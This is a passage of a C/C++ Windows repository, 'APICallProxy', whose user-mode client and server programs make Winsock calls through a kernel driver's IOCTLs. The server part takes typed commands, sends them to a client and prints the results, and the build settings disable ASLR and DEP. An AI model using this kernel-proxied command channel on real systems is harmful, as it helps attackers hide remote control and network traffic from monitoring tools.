    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Accept, &AcceptInfo, sizeof(AcceptStruct), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed to Accept Connection Error Code: 0x%x\n", GetLastError());
        goto CleanUp;
    }

    printf("[+] Connection From A Client Accepted Successfully\n");

	BOOLEAN Terminate = FALSE;
	do {

		CHAR SendBufer[100] = { 0 };
		RtlZeroMemory(SendBufer, 100);

		printf("Enter a Command maximum of 99 char: ");
		// Read up to 99 char and then 1 \n
		scanf("%99[^\n]%*1[\n]", SendBufer);

		char Exit[] = "exit";
		if (!strcmp(SendBufer, Exit)) {
			Terminate = TRUE;
		}

		SendRecvStruct	 SendInfo = { 0 };
		SendInfo.Socket = AcceptInfo.NewSocket;

		SendInfo.Buffer = SendBufer;
		SendInfo.BufferLen = strlen(SendBufer);
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Send, &SendInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed to Send to the Servre Error Code: 0x%x\n", GetLastError());
			break;
		}

        if (Terminate) {
            break;
        }

		SendRecvStruct RecvInfo = { 0 };
		char RecvBuffer[BUFSIZE * 100] ;
		RtlZeroMemory(RecvBuffer, BUFSIZE * 100);

		RecvInfo.Socket = AcceptInfo.NewSocket;
		RecvInfo.Buffer = RecvBuffer;
		RecvInfo.BufferLen = BUFSIZE * 100;
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Recv, &RecvInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed To Recive Data From Client Side Error Code: 0x%x\n", GetLastError());
			break;
		}
		
        printf("[+]Command Result:\n %s\n", RecvBuffer);
		
		Sleep(500);

	} while (1);


CleanUp:

    if (SocketInfo.Socket != NULL) {
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CloseSocket, &SocketInfo.Socket, sizeof(PVOID), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed Close Socket Error Code: 0x%x\n", GetLastError());
        }
    }

    if (AcceptInfo.NewSocket != NULL) {
        Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CloseSocket, &AcceptInfo.NewSocket, sizeof(PVOID), NULL, NULL, &returned, FALSE);
        if (!Status) {
            printf("[-] Failed Close Socket Error Code: 0x%x\n", GetLastError());
        }
    }


    Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSACleanup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
    if (!Status) {
        printf("[-] Failed To Terminates use of the Winsock Error Code: 0x%x\n", GetLastError());
    }

	


	return 0;
}
```

`APICallProxy/WinsockClient/WinsockClient.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{448052c3-fbd9-4369-b0d5-9ddaab260fa2}</ProjectGuid>
    <RootNamespace>WinsockClient</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <DebugInformationFormat>None</DebugInformationFormat>
      <ExceptionHandling>false</ExceptionHandling>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
      <RuntimeTypeInfo>false</RuntimeTypeInfo>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <RandomizedBaseAddress>false</RandomizedBaseAddress>
      <FixedBaseAddress>true</FixedBaseAddress>
      <DataExecutionPrevention>false</DataExecutionPrevention>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>
      </FunctionLevelLinking>
      <IntrinsicFunctions>false</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <DebugInformationFormat />
      <ExceptionHandling>false</ExceptionHandling>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>
      </EnableCOMDATFolding>
      <OptimizeReferences>
      </OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <RandomizedBaseAddress>false</RandomizedBaseAddress>
      <FixedBaseAddress>true</FixedBaseAddress>
      <DataExecutionPrevention>false</DataExecutionPrevention>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/WinsockClient/WinsockClient.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`APICallProxy/WinsockClient/main.cpp`:

```cpp
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>

#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"


int main() {
	BOOL Status = 1;
	DWORD returned;
	WSAStartCleanUp  WSAInfo = { 0 };
	SocketStruct	 SocketInfo = { 0 };
	ConnectStruct	 ConnectInfo = { 0 };

	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, FALSE, OPEN_EXISTING, 0, FALSE);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}


	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSAStartup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to initiates Winsock Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] initiates of the Winsock Successfully\n");


	SocketInfo.WSAStartCleanUpptr.WskDispatchPtr = WSAInfo.WskDispatchPtr;
	SocketInfo.WSAStartCleanUpptr.WskProviderPtr = WSAInfo.WskProviderPtr;
	SocketInfo.WSAStartCleanUpptr.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

#define WSK_FLAG_BASIC_SOCKET        0x00000000
#define WSK_FLAG_LISTEN_SOCKET       0x00000001
#define WSK_FLAG_CONNECTION_SOCKET   0x00000002
#define WSK_FLAG_DATAGRAM_SOCKET     0x00000004
#define WSK_FLAG_STREAM_SOCKET       0x00000008

	SocketInfo.Domain = AF_INET;
	SocketInfo.Flags = WSK_FLAG_CONNECTION_SOCKET;
	SocketInfo.Protocol = IPPROTO_TCP;
	SocketInfo.Type = SOCK_STREAM;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Socket, &SocketInfo, sizeof(SocketStruct), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Create Connection Socket Error Code: 0x%x\n", GetLastError());
		goto CleanUp;
	}

	printf("[+] Created Connection Socket Successfully\n");


	GetAddrInfoStruct AddrInfo = { 0 };
	struct addrinfo hints = { 0 };
	struct addrinfo* res;

	hints.ai_flags = AI_CANONNAME;
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	CHAR Node[] = "127.0.0.1";
	CHAR Service[] = "9095";

	AddrInfo.Hints = &hints;
	AddrInfo.Result = &res;
	AddrInfo.Node = Node;
	AddrInfo.Service = Service;

	AddrInfo.SocketInfo.WskDispatchPtr = WSAInfo.WskDispatchPtr;
	AddrInfo.SocketInfo.WskProviderPtr = WSAInfo.WskProviderPtr;
	AddrInfo.SocketInfo.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_GetAddrInfo, &AddrInfo, sizeof(GetAddrInfoStruct), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Rsolve Server Addres Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Server Address Resolved Successfully\n");


	ConnectInfo.Socket = SocketInfo.Socket;
	ConnectInfo.AddrInfo = res;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Connect, &ConnectInfo, sizeof(ConnectStruct), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Connect To Server Error Code: 0x%x\n", GetLastError());
		goto CleanUp;
	}

	printf("[+] Connected to server Successfully\n");

	INT Counter = 10;
	do {

		SendRecvStruct	 SendInfo = { 0 };
		SendInfo.Socket = SocketInfo.Socket;
		CHAR SendBufer[] = "Hello From Client Side\n";

		SendInfo.Buffer = SendBufer;
		SendInfo.BufferLen = 23;
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Send, &SendInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed to Send to the Servre Error Code: 0x%x\n", GetLastError());
			break;
		}

		printf("[+] Client: %s\n", SendBufer);

		SendRecvStruct RecvInfo = { 0 };
		char RecvBuffer[1024] = { 0 };
		RecvInfo.Socket = SocketInfo.Socket;
		RecvInfo.Buffer = RecvBuffer;
		RecvInfo.BufferLen = 1024;
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Recv, &RecvInfo, sizeof(SendRecvStruct), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed To Recive Data From Client Side Error Code: 0x%x\n", GetLastError());
			break;
		}
		else {
			printf("[+] Sever: %s\n", RecvBuffer);
		}

		Sleep(500);
		

	} while (Counter--);


CleanUp:

	if (SocketInfo.Socket != NULL) {
		Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CloseSocket, &SocketInfo.Socket, sizeof(PVOID), NULL, NULL, &returned, FALSE);
		if (!Status) {
			printf("[-] Failed Close Socket Error Code: 0x%x\n", GetLastError());
		}
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSACleanup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Terminates use of the Winsock Error Code: 0x%x\n", GetLastError());
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Terminates use of the Winsock Error Code: 0x%x\n", GetLastError());
	}

	return 0;
}
```

`APICallProxy/WinsockServer/WinsockServer.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{a3cd5a6f-848d-480d-b8ad-64410602476d}</ProjectGuid>
    <RootNamespace>WinsockServer</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>
      </FunctionLevelLinking>
      <IntrinsicFunctions>false</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <DebugInformationFormat>None</DebugInformationFormat>
      <SupportJustMyCode>true</SupportJustMyCode>
      <Optimization>Disabled</Optimization>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeTypeInfo>false</RuntimeTypeInfo>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>
      </EnableCOMDATFolding>
      <OptimizeReferences>
      </OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <RandomizedBaseAddress>false</RandomizedBaseAddress>
      <FixedBaseAddress>true</FixedBaseAddress>
      <DataExecutionPrevention>false</DataExecutionPrevention>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/WinsockServer/WinsockServer.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`APICallProxy/WinsockServer/main.cpp`:

```cpp
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>

#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"

//used only for htons()
#pragma comment(lib, "Ws2_32.lib")


int main() {
	BOOL Status = 1;
	DWORD returned;
	WSAStartCleanUp  WSAInfo = { 0 };
	SocketStruct	 SocketInfo = { 0 };
	SendRecvStruct	 SendInfo = { 0 };
	BindStruct		 BindInfo = { 0 };
	AcceptStruct	 AcceptInfo = { 0 };


	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, FALSE, OPEN_EXISTING, 0, FALSE);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}


	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WSAStartup, &WSAInfo, sizeof(WSAStartCleanUp), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to initiates Winsock Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] initiates of the Winsock Successfully\n");


	SocketInfo.WSAStartCleanUpptr.WskDispatchPtr = WSAInfo.WskDispatchPtr;
	SocketInfo.WSAStartCleanUpptr.WskProviderPtr = WSAInfo.WskProviderPtr;
	SocketInfo.WSAStartCleanUpptr.WskRegistrationPtr = WSAInfo.WskRegistrationPtr;

#define WSK_FLAG_BASIC_SOCKET        0x00000000
#define WSK_FLAG_LISTEN_SOCKET       0x00000001
#define WSK_FLAG_CONNECTION_SOCKET   0x00000002
#define WSK_FLAG_DATAGRAM_SOCKET     0x00000004
#define WSK_FLAG_STREAM_SOCKET       0x00000008

	SocketInfo.Domain = AF_INET;
	SocketInfo.Flags = WSK_FLAG_LISTEN_SOCKET;
	SocketInfo.Protocol = IPPROTO_TCP;
	SocketInfo.Type = SOCK_STREAM;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Socket, &SocketInfo, sizeof(SocketStruct), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Create Listen Socket Error Code: 0x%x\n", GetLastError());
		goto CleanUp;
	}

	printf("[+] Created Listen Socket Successfully\n");


	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(9095);

	BindInfo.Socket = SocketInfo.Socket;
	BindInfo.Address = &addr;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Bind, &BindInfo, sizeof(BindStruct), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Bind Socket Error Code: 0x%x\n", GetLastError());
		goto CleanUp;
	}

	printf("[+] Binding Socket Successfully\n");


	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_listen, NULL, NULL, NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Listen on Socket Error Code: 0x%x\n", GetLastError());
		goto CleanUp;
	}

	printf("[+] Listen on Socket Successfully\n");

	INT SocLen = 0;
	AcceptInfo.Socket = SocketInfo.Socket;
	AcceptInfo.Address = &addr;
	AcceptInfo.SocketLen = &SocLen;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_Accept, &AcceptInfo, sizeof(AcceptStruct), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Accept Connection Error Code: 0x%x\n", GetLastError());
		goto CleanUp;
	}

